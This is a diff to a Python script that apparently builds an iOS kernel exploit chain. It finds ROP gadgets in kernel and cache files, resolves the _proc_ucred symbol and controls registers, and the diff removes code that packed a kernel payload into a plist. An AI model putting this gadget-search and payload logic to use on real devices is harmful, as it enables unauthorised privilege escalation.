@@ -26,7 +26,7 @@ def dbg_result():
         back = sys._getframe().f_back
         funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)
 
-dmini.init(['-k', kernfile])
+dmini.init(kernfile, False)
 
 # R4 R7 PC
 
@@ -38,7 +38,7 @@ popdude = dmini.cur.find_multiple('+ a7 f1 14 0d bd e8 00 05 f0 bd', '?')
 
 proc_ucred = dmini.cur.sym('_proc_ucred')
 
-dmini.init(['-c', cachefile])
+dmini.init(cachefile, True)
 
 def wrap(num):
     if (num & 0xf0000000) == 0x30000000:
@@ -47,16 +47,7 @@ def wrap(num):
         return num
 dmini.cur.wrap = wrap
 
-ldm, stub, num_before_r0, num_after_r0 = dmini.cur.find_ldms(0x14414114)
-#print hex(ldm), hex(stub), num_before_r0, num_after_r0
-
-kernstuff = ([0] * num_before_r0) + [0xffffffff] + ([0] * num_after_r0) + [popdude, mcrdude]
-kernstuff = struct.pack('I'*len(kernstuff), *kernstuff)
-
-kernstuff += '\0' * ((-len(kernstuff) & 0xfff) + (stub & 0xfff))
-
-plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
-
+plist = ''
 if mode == 'dejavu':
     init('R4', 'R5', 'PC')
     make_r7_avail()
